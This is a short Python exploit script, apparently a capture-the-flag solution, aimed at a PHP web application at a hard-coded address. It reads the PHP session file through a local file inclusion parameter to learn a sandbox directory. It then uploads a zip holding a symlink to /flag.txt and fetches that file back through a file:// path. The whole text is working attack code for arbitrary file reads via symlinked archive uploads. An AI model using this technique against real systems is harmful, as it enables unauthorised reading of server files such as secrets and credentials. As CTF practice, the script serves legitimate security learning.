import requests
import os

url = "http://65.108.176.76:8200"

s = requests.Session()
res = s.get(url)
sess_id = s.cookies["PHPSESSID"]
print(f"[+] PHPSESSID = {sess_id}")

res = s.get(f"{url}/?file=/var/lib/php/sessions/sess_{sess_id}")
sandbox = res.text.split(":")[-1].split(";")[0][1:-1]
print(f"[+] sandbox = {sandbox}")

symlink = "leak.lnk"
file_url = f"file:///var/www/html/data/{sandbox}/{symlink}"

os.system("rm -rf leak.lnk go.zip file:")
os.system(f"ln -s /flag.txt leak.lnk")
os.system(f"mkdir -p {file_url}")
os.system(f"zip --symlinks -r go.zip file: {symlink}")

files = {"file": open("go.zip", "rb")}
res = s.post(f"{url}", files=files)
res = s.get(f"{url}/?file={file_url}")
print(res.text)
